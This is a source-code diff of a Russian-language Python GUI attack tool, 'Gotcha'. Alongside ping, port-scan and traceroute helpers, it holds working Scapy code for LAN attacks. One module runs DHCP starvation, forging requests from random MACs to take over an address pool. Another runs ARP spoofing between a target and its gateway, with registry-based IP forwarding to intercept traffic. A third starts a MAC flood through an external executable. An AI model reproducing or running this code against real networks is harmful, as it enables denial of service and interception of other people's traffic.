         threading.Thread(target=ping_worker, daemon=True).start()
-
     def run_port_scan(self):
         def worker():
             ip = self.access_ip.get()
@@ -1146,13 +938,11 @@ class Gotcha:
                     pass
             self.access_output.insert('end', "Сканирование завершено\n")
         threading.Thread(target=worker, daemon=True).start()
-    
     def run_traceroute(self):
         def traceroute_worker():
             ip = self.access_ip.get()
             self.access_output.insert('end', f"Traceroute к {ip}...\n")
             self.access_output.see('end')
-            
             try:
                 if os.name == 'nt':
                     cmd = ['tracert', '-d', '-h', '30', '-w', '1000', ip]
@@ -1160,7 +950,6 @@ class Gotcha:
                 else:
                     cmd = ['traceroute', '-n', '-m', '30', '-w', '1', ip]
                     encoding = 'utf-8'
-                
                 process = subprocess.Popen(
                     cmd,
                     stdout=subprocess.PIPE,
@@ -1170,35 +959,27 @@ class Gotcha:
                     errors='replace',
                     bufsize=1
                 )
-                
                 for line in iter(process.stdout.readline, ''):
                     self.access_output.insert('end', line)
                     self.access_output.see('end')
                     self.root.update()
-                
                 process.stdout.close()
                 process.wait()
-                
                 self.access_output.insert('end', f"\nTraceroute завершен.\n")
                 self.access_output.see('end')
-                
             except Exception as e:
                 self.access_output.insert('end', f"Ошибка Traceroute: {str(e)}\n")
-        
         threading.Thread(target=traceroute_worker, daemon=True).start()
-
     def show_ip_route(self):
         def worker():
             self.access_output.insert('end', "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\n")
             route_info = self.get_ip_route_formatted()
             self.access_output.insert('end', route_info + "\n")
         threading.Thread(target=worker, daemon=True).start()
-
     def get_ip_route_formatted(self):
         try:
             result = subprocess.run(['route', 'print'], capture_output=True, text=True, encoding='cp866', errors='replace')
             lines = result.stdout.split('\n')
-            
             ipv4_section = []
             in_ipv4 = False
             for line in lines:
@@ -1210,23 +991,18 @@ class Gotcha:
                 if in_ipv4:
                     if line.strip() or '=' in line:
                         ipv4_section.append(line.rstrip())
-            
             if not ipv4_section:
                 return "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\nНе удалось найти IPv4 маршруты.\n"
-            
             output = "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\n\n" + "\n".join(ipv4_section)
             return output
-            
         except Exception as e:
             return f"=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\nОшибка: {str(e)}"
-
     def show_network_info(self):
         def worker():
             self.access_output.insert('end', "=== СЕТЕВЫЕ АДАПТЕРЫ ===\n")
             info = self.get_network_adapters()
             self.access_output.insert('end', info + "\n")
         threading.Thread(target=worker, daemon=True).start()
-
     def get_network_adapters(self):
         try:
             interfaces = get_if_list()
@@ -1246,42 +1022,33 @@ class Gotcha:
             return "\n".join(result)
         except Exception as e:
             return f"Ошибка получения сетевых адаптеров: {str(e)}"
-
-                                     
     def setup_dhcp_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
-        
         left_frame = ttk.Frame(main_frame)
         left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
-        
         right_frame = ttk.Frame(main_frame)
         right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
-        
         params_frame = ttk.LabelFrame(left_frame, text="Параметры DHCP Starvation")
         params_frame.pack(fill='x', padx=5, pady=5)
-        
         row1 = ttk.Frame(params_frame)
         row1.pack(fill='x', padx=5, pady=5)
         ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
         self.dhcp_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
         self.dhcp_interface.pack(side='left', padx=2)
         self.dhcp_interface.set(self.active_interface)
-        
         row2 = ttk.Frame(params_frame)
         row2.pack(fill='x', padx=5, pady=5)
         ttk.Label(row2, text="Размер пула:", width=12).pack(side='left', padx=2)
         self.dhcp_pool_size = ttk.Entry(row2, width=10, font=('Arial', 9))
         self.dhcp_pool_size.pack(side='left', padx=2)
         self.dhcp_pool_size.insert(0, "254")
-        
         row3 = ttk.Frame(params_frame)
         row3.pack(fill='x', padx=5, pady=5)
         ttk.Label(row3, text="Кол-во запросов:", width=12).pack(side='left', padx=2)
         self.dhcp_request_count = ttk.Entry(row3, width=10, font=('Arial', 9))
         self.dhcp_request_count.pack(side='left', padx=2)
         self.dhcp_request_count.insert(0, "1000")
-        
         row4 = ttk.Frame(params_frame)
         row4.pack(fill='x', padx=5, pady=5)
         ttk.Label(row4, text="Задержка (сек):", width=12).pack(side='left', padx=2)
@@ -1294,62 +1061,47 @@ class Gotcha:
         self.dhcp_offer_timeout = ttk.Entry(row5, width=10, font=('Arial', 9))
         self.dhcp_offer_timeout.pack(side='left', padx=2)
         self.dhcp_offer_timeout.insert(0, "30")
-
         row6 = ttk.Frame(params_frame)
         row6.pack(fill='x', padx=5, pady=5)
         ttk.Label(row6, text="Таймаут ACK (сек):", width=18).pack(side='left', padx=2)
         self.dhcp_ack_timeout = ttk.Entry(row6, width=10, font=('Arial', 9))
         self.dhcp_ack_timeout.pack(side='left', padx=2)
         self.dhcp_ack_timeout.insert(0, "5")
-        
         button_frame = ttk.Frame(params_frame)
         button_frame.pack(fill='x', padx=5, pady=10)
-        
         self.dhcp_start_btn = ttk.Button(button_frame, text="Начать DHCP Starvation", 
                                        command=self.start_dhcp_attack, width=20)
         self.dhcp_start_btn.pack(side='left', padx=5)
-        
         self.dhcp_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                       command=self.stop_dhcp_attack, width=15, state='disabled')
         self.dhcp_stop_btn.pack(side='left', padx=5)
-        
         stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
         stats_frame.pack(fill='x', padx=5, pady=5)
-        
         stats_grid = ttk.Frame(stats_frame)
         stats_grid.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
         self.dhcp_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.dhcp_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
         self.dhcp_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.dhcp_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Уникальных MAC:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
         self.dhcp_unique = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.dhcp_unique.grid(row=2, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
         self.dhcp_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
         self.dhcp_time.grid(row=3, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Захваченные IP:", width=20, anchor='w').grid(row=4, column=0, padx=5, pady=2, sticky='w')
         self.dhcp_offered_label = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.dhcp_offered_label.grid(row=4, column=1, padx=5, pady=2, sticky='w')
-        
         log_frame = ttk.LabelFrame(right_frame, text="Лог DHCP Starvation")
         log_frame.pack(fill='both', expand=True, padx=5, pady=5)
-        
         self.dhcp_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
         self.dhcp_log.pack(fill='both', expand=True, padx=5, pady=5)
-        
         btn_frame = ttk.Frame(log_frame)
         btn_frame.pack(fill='x', padx=5, pady=5)
         ttk.Button(btn_frame, text="Сохранить лог", 
                   command=lambda: self.save_log(self.dhcp_log), width=14).pack()
-        
         self.dhcp_stats = {
             'start_time': 0,
             'sent_packets': 0,
@@ -1362,12 +1114,10 @@ class Gotcha:
         self.dhcp_lock = threading.Lock()
         self.dhcp_sniff_stop = None
         self.dhcp_sniff_thread = None
-    
     def start_dhcp_attack(self):
         self.dhcp_attack_running = True
         self.dhcp_start_btn.config(state='disabled')
         self.dhcp_stop_btn.config(state='normal')
-        
         try:
             pool_size = int(self.dhcp_pool_size.get())
             request_count = int(self.dhcp_request_count.get())
@@ -1380,7 +1130,6 @@ class Gotcha:
             delay = 0.005
             offer_timeout = 30
             ack_timeout = 5
-        
         self.dhcp_stats = {
             'start_time': time.time(),
             'sent_packets': 0,
@@ -1391,26 +1140,20 @@ class Gotcha:
         with self.dhcp_lock:
             self.dhcp_offered_ips.clear()
             self.dhcp_offers.clear()
-        
-                                                           
         self.dhcp_sniff_stop = threading.Event()
         self.dhcp_sniff_thread = threading.Thread(target=self.dhcp_sniff_worker, args=(self.dhcp_interface.get(),))
         self.dhcp_sniff_thread.daemon = True
         self.dhcp_sniff_thread.start()
-        
         self.dhcp_thread = threading.Thread(
             target=self.dhcp_attack_worker,
             args=(self.dhcp_interface.get(), pool_size, request_count, delay, offer_timeout, ack_timeout)
         )
         self.dhcp_thread.daemon = True
         self.dhcp_thread.start()
-        
         self.update_dhcp_stats()
-        
         self.dhcp_log.insert('end', f"DHCP Starvation started (pool size: {pool_size} IPs)\n")
         self.dhcp_log.insert('end', f"Interface: {self.dhcp_interface.get()}\n")
         self.status_var.set("DHCP Starvation запущена")
-    
     def dhcp_sniff_worker(self, iface):
         def handle_packet(pkt):
             if not self.dhcp_attack_running:
@@ -1427,7 +1170,6 @@ class Gotcha:
                         offered_ip = pkt[BOOTP].yiaddr
                         if offered_ip != '0.0.0.0':
                             now = time.time()
-                                                                                          
                             if xid in self.last_offer_time and (now - self.last_offer_time[xid]) < 0.5:
                                 return False
                             self.last_offer_time[xid] = now
@@ -1452,24 +1194,19 @@ class Gotcha:
             return False
         sniff(iface=iface, filter="udp port 67 or udp port 68", prn=handle_packet,
             stop_filter=lambda x: not self.dhcp_attack_running)
-        
     def stop_dhcp_attack(self):
         self.dhcp_attack_running = False
         self.dhcp_start_btn.config(state='normal')
         self.dhcp_stop_btn.config(state='disabled')
-        
         if self.dhcp_sniff_stop:
             self.dhcp_sniff_stop.set()
         if self.dhcp_sniff_thread and self.dhcp_sniff_thread.is_alive():
             self.dhcp_sniff_thread.join(timeout=2.0)
-        
         if self.dhcp_thread and self.dhcp_thread.is_alive():
             self.dhcp_thread.join(timeout=1.0)
-        
         total_time = time.time() - self.dhcp_stats['start_time']
         total_packets = self.dhcp_stats['sent_packets']
         total_bytes = total_packets * 590                      
-        
         self.dhcp_log.insert('end', "\n--- Results ---\n")
         self.dhcp_log.insert('end', f"Total packets sent: {total_packets}\n")
         self.dhcp_log.insert('end', f"Unique MACs: {len(self.dhcp_stats['unique_macs'])}\n")
@@ -1484,43 +1221,33 @@ class Gotcha:
         self.dhcp_log.insert('end', f"Total data: {total_bytes} bytes\n")
         if total_time > 0:
             self.dhcp_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
-        
         self.status_var.set("DHCP Starvation остановлена")
-    
     def update_dhcp_stats(self):
         if not self.dhcp_attack_running:
             return
-            
         current_time = time.time()
         duration = current_time - self.dhcp_stats['start_time']
         time_diff = current_time - self.dhcp_stats['last_update']
-        
         if time_diff >= 1:
             packets_sent = self.dhcp_stats['sent_packets'] - self.dhcp_stats.get('last_sent', 0)
             current_rate = packets_sent / time_diff if time_diff > 0 else 0
-            
             self.dhcp_rate.config(text=f"{int(current_rate)}")
             self.dhcp_stats['last_update'] = current_time
             self.dhcp_stats['last_sent'] = self.dhcp_stats['sent_packets']
-        
         self.dhcp_sent.config(text=str(self.dhcp_stats['sent_packets']))
         self.dhcp_unique.config(text=str(len(self.dhcp_stats['unique_macs'])))
         with self.dhcp_lock:
             self.dhcp_offered_label.config(text=str(len(self.dhcp_offered_ips)))
-        
         hours = int(duration // 3600)
         minutes = int((duration % 3600) // 60)
         seconds = int(duration % 60)
         self.dhcp_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
-        
         if self.dhcp_attack_running:
             self.root.after(1000, self.update_dhcp_stats)
-    
     def dhcp_attack_worker(self, interface, pool_size, request_count, delay, offer_timeout, ack_timeout):
         try:
             packet_count = 0
             used_macs = set()
-            
             while self.dhcp_attack_running and packet_count < request_count:
                 mac = self.generate_random_mac()
                 if mac in used_macs:
@@ -1530,19 +1257,14 @@ class Gotcha:
                 used_macs.add(mac)
                 mac_bytes = bytes.fromhex(mac.replace(':', ''))
                 xid = random.randint(1, 0xFFFFFFFF)
-                
-                                        
                 dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                             IP(src="0.0.0.0", dst="255.255.255.255") / \
                             UDP(sport=68, dport=67) / \
                             BOOTP(chaddr=mac_bytes, xid=xid) / \
                             DHCP(options=[("message-type", "discover"), "end"])
-                
                 sendp(dhcp_discover, iface=interface, verbose=0)
                 packet_count += 1
                 self.dhcp_stats['sent_packets'] = packet_count
-                
-                                                    
                 offer_deadline = time.time() + offer_timeout
                 offered_ip = None
                 while time.time() < offer_deadline and self.dhcp_attack_running:
@@ -1551,9 +1273,7 @@ class Gotcha:
                             offered_ip = self.dhcp_offers.pop(xid)
                             break
                     time.sleep(0.1)                            
-                
                 if offered_ip:
-                                           
                     dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                                 IP(src="0.0.0.0", dst="255.255.255.255") / \
                                 UDP(sport=68, dport=67) / \
@@ -1564,8 +1284,6 @@ class Gotcha:
                     sendp(dhcp_request, iface=interface, verbose=0)
                     packet_count += 1
                     self.dhcp_stats['sent_packets'] = packet_count
-                    
-                                                    
                     ack_deadline = time.time() + ack_timeout
                     ack_received = False
                     while time.time() < ack_deadline and self.dhcp_attack_running:
@@ -1574,141 +1292,109 @@ class Gotcha:
                                 ack_received = True
                                 break
                         time.sleep(0.1)
-                    
                     if ack_received:
                         self.dhcp_log.insert('end', f"[CAPTURED] IP {offered_ip} подтверждён (ACK)\n")
                     else:
                         self.dhcp_log.insert('end', f"[WARN] Не получен ACK для IP {offered_ip} (таймаут {ack_timeout} сек)\n")
                 else:
                     self.dhcp_log.insert('end', f"[WARN] Не получен offer для {mac} (таймаут {offer_timeout} сек)\n")
-                
                 if delay > 0:
                     time.sleep(delay)
-                
                 if len(used_macs) >= pool_size:
                     used_macs.clear()
                     time.sleep(1)
-                    
         except Exception as e:
             self.dhcp_log.insert('end', f"DHCP Starvation error: {str(e)}\n")
             self.stop_dhcp_attack()
-
-                                  
     def setup_arp_spoof_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
-        
         left_frame = ttk.Frame(main_frame)
         left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
-        
         right_frame = ttk.Frame(main_frame)
         right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
-
         params_frame = ttk.LabelFrame(left_frame, text="Параметры ARP Spoofing")
         params_frame.pack(fill='x', padx=5, pady=5)
-        
         row1 = ttk.Frame(params_frame)
         row1.pack(fill='x', padx=5, pady=5)
         ttk.Label(row1, text="IP цели:", width=12).pack(side='left', padx=2)
         self.arp_target_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
         self.arp_target_ip.pack(side='left', padx=2)
         self.arp_target_ip.insert(0, "192.168.1.2")
-        
         row2 = ttk.Frame(params_frame)
         row2.pack(fill='x', padx=5, pady=5)
         ttk.Label(row2, text="IP шлюза:", width=12).pack(side='left', padx=2)
         self.arp_gateway_ip = ttk.Entry(row2, width=25, font=('Arial', 9))
         self.arp_gateway_ip.pack(side='left', padx=2)
         self.arp_gateway_ip.insert(0, "192.168.1.1")
-        
         row3 = ttk.Frame(params_frame)
         row3.pack(fill='x', padx=5, pady=5)
         ttk.Label(row3, text="Интерфейс:", width=12).pack(side='left', padx=2)
         self.arp_spoof_interface = ttk.Combobox(row3, width=25, font=('Arial', 9), values=self.network_interfaces)
         self.arp_spoof_interface.pack(side='left', padx=2)
         self.arp_spoof_interface.set(self.active_interface)
-        
         row4 = ttk.Frame(params_frame)
         row4.pack(fill='x', padx=5, pady=5)
         ttk.Label(row4, text="Интервал (сек):", width=12).pack(side='left', padx=2)
         self.arp_spoof_interval = ttk.Entry(row4, width=10, font=('Arial', 9))
         self.arp_spoof_interval.pack(side='left', padx=2)
         self.arp_spoof_interval.insert(0, "2")
-        
         self.restore_arp_var = tk.BooleanVar(value=True)
         ttk.Checkbutton(params_frame, text="Восстанавливать ARP после остановки", variable=self.restore_arp_var).pack(anchor='w', padx=5, pady=2)
-
         self.ip_forward_var = tk.BooleanVar(value=False)
         ttk.Checkbutton(params_frame, text="Включить IP forwarding (перехват трафика)", variable=self.ip_forward_var).pack(anchor='w', padx=5, pady=2)
-        
         button_frame = ttk.Frame(params_frame)
         button_frame.pack(fill='x', padx=5, pady=10)
-        
         self.arp_spoof_start_btn = ttk.Button(button_frame, text="Начать ARP Spoofing", 
                                             command=self.start_arp_spoof, width=18)
         self.arp_spoof_start_btn.pack(side='left', padx=5)
-        
         self.arp_spoof_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                            command=self.stop_arp_spoof, width=15, state='disabled')
         self.arp_spoof_stop_btn.pack(side='left', padx=5)
-        
         stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
         stats_frame.pack(fill='x', padx=5, pady=5)
-        
         stats_grid = ttk.Frame(stats_frame)
         stats_grid.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
         self.arp_spoof_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.arp_spoof_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
         self.arp_spoof_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.arp_spoof_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
         self.arp_spoof_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
         self.arp_spoof_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
-        
         log_frame = ttk.LabelFrame(right_frame, text="Лог ARP Spoofing")
         log_frame.pack(fill='both', expand=True, padx=5, pady=5)
-        
         self.arp_spoof_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
         self.arp_spoof_log.pack(fill='both', expand=True, padx=5, pady=5)
-        
         btn_frame = ttk.Frame(log_frame)
         btn_frame.pack(fill='x', padx=5, pady=5)
         ttk.Button(btn_frame, text="Сохранить лог", 
                   command=lambda: self.save_log(self.arp_spoof_log), width=14).pack()
-
         self.arp_spoof_stats = {
             'start_time': 0,
             'sent_packets': 0,
             'last_update': 0,
             'last_sent': 0
         }
-    
     def start_arp_spoof(self):
         self.arp_spoof_running = True
         self.arp_spoof_start_btn.config(state='disabled')
         self.arp_spoof_stop_btn.config(state='normal')
-        
         try:
             interval = float(self.arp_spoof_interval.get())
         except:
             interval = 2.0
-        
         self.arp_spoof_stats = {
             'start_time': time.time(),
             'sent_packets': 0,
             'last_update': time.time(),
             'last_sent': 0
         }
-        
         if self.ip_forward_var.get():
             self.enable_ip_forward(True)
             self.arp_spoof_log.insert('end', "IP forwarding включён\n")
-        
         self.arp_spoof_thread = threading.Thread(
             target=self.arp_spoof_worker,
             args=(self.arp_target_ip.get(), self.arp_gateway_ip.get(), 
@@ -1716,31 +1402,23 @@ class Gotcha:
         )
         self.arp_spoof_thread.daemon = True
         self.arp_spoof_thread.start()
-        
         self.update_arp_spoof_stats()
-        
         self.arp_spoof_log.insert('end', f"ARP Spoofing started (interval: {interval}s)\n")
         self.status_var.set("ARP Spoofing запущен")
-    
     def stop_arp_spoof(self):
         self.arp_spoof_running = False
         self.arp_spoof_start_btn.config(state='normal')
         self.arp_spoof_stop_btn.config(state='disabled')
-        
         if self.arp_spoof_thread and self.arp_spoof_thread.is_alive():
             self.arp_spoof_thread.join(timeout=1.0)
-        
         if self.ip_forward_var.get():
             self.enable_ip_forward(False)
             self.arp_spoof_log.insert('end', "IP forwarding отключён\n")
-        
         if self.restore_arp_var.get():
             self.restore_arp()
-        
         total_time = time.time() - self.arp_spoof_stats['start_time']
         total_packets = self.arp_spoof_stats['sent_packets']
         total_bytes = total_packets * 42                          
-        
         self.arp_spoof_log.insert('end', "\n--- Results ---\n")
         self.arp_spoof_log.insert('end', f"Total packets sent: {total_packets}\n")
         self.arp_spoof_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
@@ -1749,9 +1427,7 @@ class Gotcha:
         self.arp_spoof_log.insert('end', f"Total data: {total_bytes} bytes\n")
         if total_time > 0:
             self.arp_spoof_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
-        
         self.status_var.set("ARP Spoofing остановлен")
-    
     def enable_ip_forward(self, enable):
         try:
             key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
@@ -1766,7 +1442,6 @@ class Gotcha:
             self.arp_spoof_log.insert('end', f"IP forwarding {'включён' if enable else 'отключён'}\n")
         except Exception as e:
             self.arp_spoof_log.insert('end', f"Не удалось изменить IP forwarding: {e}\n")
-    
     def restore_arp(self):
         try:
             target_ip = self.arp_target_ip.get()
@@ -1775,7 +1450,6 @@ class Gotcha:
             target_mac = self.get_mac_by_ip(target_ip, iface)
             gateway_mac = self.get_mac_by_ip(gateway_ip, iface)
             attacker_mac = get_if_hwaddr(iface)
-
             if target_mac:
                 pkt = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
                 sendp(pkt, iface=iface, verbose=0)
@@ -1786,7 +1460,6 @@ class Gotcha:
                 self.arp_spoof_log.insert('end', f"Восстановлен ARP для шлюза: {gateway_ip} -> {target_mac}\n")
         except Exception as e:
             self.arp_spoof_log.insert('end', f"Ошибка восстановления ARP: {e}\n")
-    
     def get_mac_by_ip(self, ip, iface):
         try:
             ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, iface=iface)
@@ -1795,37 +1468,29 @@ class Gotcha:
         except:
             pass
         return None
-    
     def update_arp_spoof_stats(self):
         if not self.arp_spoof_running:
             return
-            
         current_time = time.time()
         duration = current_time - self.arp_spoof_stats['start_time']
         time_diff = current_time - self.arp_spoof_stats['last_update']
-        
         if time_diff >= 1:
             packets_sent = self.arp_spoof_stats['sent_packets'] - self.arp_spoof_stats.get('last_sent', 0)
             current_rate = packets_sent / time_diff if time_diff > 0 else 0
             self.arp_spoof_rate.config(text=f"{int(current_rate)}")
             self.arp_spoof_stats['last_update'] = current_time
             self.arp_spoof_stats['last_sent'] = self.arp_spoof_stats['sent_packets']
-        
         self.arp_spoof_sent.config(text=str(self.arp_spoof_stats['sent_packets']))
-        
         hours = int(duration // 3600)
         minutes = int((duration % 3600) // 60)
         seconds = int(duration % 60)
         self.arp_spoof_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
-        
         if self.arp_spoof_running:
             self.root.after(1000, self.update_arp_spoof_stats)
-    
     def arp_spoof_worker(self, target_ip, gateway_ip, interface, interval):
         try:
             packet_count = 0
             attacker_mac = get_if_hwaddr(interface)
-            
             while self.arp_spoof_running:
                 arp_to_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                     op=2,
@@ -1845,7 +1510,6 @@ class Gotcha:
                 sendp(arp_to_gateway, iface=interface, verbose=0)
                 packet_count += 2
                 self.arp_spoof_stats['sent_packets'] = packet_count
-                
                 sleep_time = interval
                 step = 0.1
                 while sleep_time > 0 and self.arp_spoof_running:
@@ -1853,35 +1517,27 @@ class Gotcha:
                     sleep_time -= step
         except Exception as e:
             self.arp_spoof_log.insert('end', f"ARP Spoofing error: {str(e)}\n")
-
-                               
     def setup_mac_flood_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
-        
         left_frame = ttk.Frame(main_frame)
         left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
-        
         right_frame = ttk.Frame(main_frame)
         right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
-        
         params_frame = ttk.LabelFrame(left_frame, text="Параметры MAC flood")
         params_frame.pack(fill='x', padx=5, pady=5)
-        
         row1 = ttk.Frame(params_frame)
         row1.pack(fill='x', padx=5, pady=5)
         ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
         self.mac_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
         self.mac_interface.pack(side='left', padx=2)
         self.mac_interface.set(self.active_interface)
-        
         row2 = ttk.Frame(params_frame)
         row2.pack(fill='x', padx=5, pady=5)
         ttk.Label(row2, text="Потоков:", width=12).pack(side='left', padx=2)
         self.mac_threads = ttk.Entry(row2, width=10, font=('Arial', 9))
         self.mac_threads.pack(side='left', padx=2)
         self.mac_threads.insert(0, "4")
-        
         row3 = ttk.Frame(params_frame)
         row3.pack(fill='x', padx=5, pady=5)
         ttk.Label(row3, text="Время (сек):", width=12).pack(side='left', padx=2)
@@ -1889,69 +1545,52 @@ class Gotcha:
         self.mac_duration.pack(side='left', padx=2)
         self.mac_duration.insert(0, "60")
         ttk.Label(row3, text="(0=бесконечно)").pack(side='left', padx=5)
-        
         row4 = ttk.Frame(params_frame)
         row4.pack(fill='x', padx=5, pady=5)
         ttk.Label(row4, text="MAC назначения:", width=12).pack(side='left', padx=2)
         self.mac_dst = ttk.Entry(row4, width=25, font=('Arial', 9))
         self.mac_dst.pack(side='left', padx=2)
         self.mac_dst.insert(0, "ff:ff:ff:ff:ff:ff")
-        
         row5 = ttk.Frame(params_frame)
         row5.pack(fill='x', padx=5, pady=5)
         self.mac_random = tk.BooleanVar(value=False)
         ttk.Checkbutton(row5, text="Случайный MAC источника", variable=self.mac_random).pack(side='left', padx=5)
-        
         button_frame = ttk.Frame(params_frame)
         button_frame.pack(fill='x', padx=5, pady=10)
-        
         self.mac_start_btn = ttk.Button(button_frame, text="Начать MAC flood",
                                         command=self.start_mac_flood, width=18)
         self.mac_start_btn.pack(side='left', padx=5)
-        
         self.mac_stop_btn = ttk.Button(button_frame, text="Остановить",
                                        command=self.stop_mac_flood, width=15, state='disabled')
         self.mac_stop_btn.pack(side='left', padx=5)
-        
         stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
         stats_frame.pack(fill='x', padx=5, pady=5)
-        
         stats_grid = ttk.Frame(stats_frame)
         stats_grid.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(stats_grid, text="Отправлено кадров:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
         self.mac_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.mac_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Скорость (fps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
         self.mac_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.mac_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
         self.mac_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
         self.mac_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
-        
         log_frame = ttk.LabelFrame(right_frame, text="Лог MAC flood")
         log_frame.pack(fill='both', expand=True, padx=5, pady=5)
-        
         self.mac_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
         self.mac_log.pack(fill='both', expand=True, padx=5, pady=5)
-        
         btn_frame = ttk.Frame(log_frame)
         btn_frame.pack(fill='x', padx=5, pady=5)
         ttk.Button(btn_frame, text="Сохранить лог",
                   command=lambda: self.save_log(self.mac_log), width=14).pack()
-        
         self.mac_stats = {'start_time': 0, 'sent_frames': 0}
-    
     def start_mac_flood(self):
         if self.mac_attack_running:
             return
-
         self.mac_attack_running = True
         self.mac_start_btn.config(state='disabled')
         self.mac_stop_btn.config(state='normal')
-
         try:
             interface = self.mac_interface.get()
             threads = int(self.mac_threads.get())
@@ -1963,20 +1602,17 @@ class Gotcha:
             self.mac_attack_running = False
             self.mac_start_btn.config(state='normal')
             return
-
         exe_path = find_exe("mac.exe")
         if not exe_path:
             self.mac_log.insert('end', "Error: mac.exe not found!\n")
             self.mac_attack_running = False
             self.mac_start_btn.config(state='normal')
             return
-
         args = [exe_path, interface, str(threads), str(duration)]
         if dst_mac:
             args.append(dst_mac)
         if random_mac:
             args.append("--random-mac")
-
         self.mac_log.delete(1.0, tk.END)
         self.mac_log.insert('end', f"MAC flood started\n")
         self.mac_log.insert('end', f"Interface: {interface}\n")
@@ -1984,9 +1620,7 @@ class Gotcha:
         self.mac_log.insert('end', f"Duration: {duration} sec\n")
         self.mac_log.insert('end', f"Dest MAC: {dst_mac}\n")
         self.mac_log.insert('end', f"Random source MAC: {'yes' if random_mac else 'no'}\n")
-
         self.mac_stop_event = threading.Event()
-
         def mac_stats_callback(data):
             if not self.mac_attack_running:
                 return
@@ -1999,7 +1633,6 @@ class Gotcha:
             minutes = (elapsed % 3600) // 60
             seconds = elapsed % 60
             self.mac_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
-
         self.mac_external_thread = threading.Thread(
             target=self.run_external_tool,
             args=(args, self.mac_log, self.mac_stop_event, 'mac'),
@@ -2007,10 +1640,8 @@ class Gotcha:
             daemon=True
         )
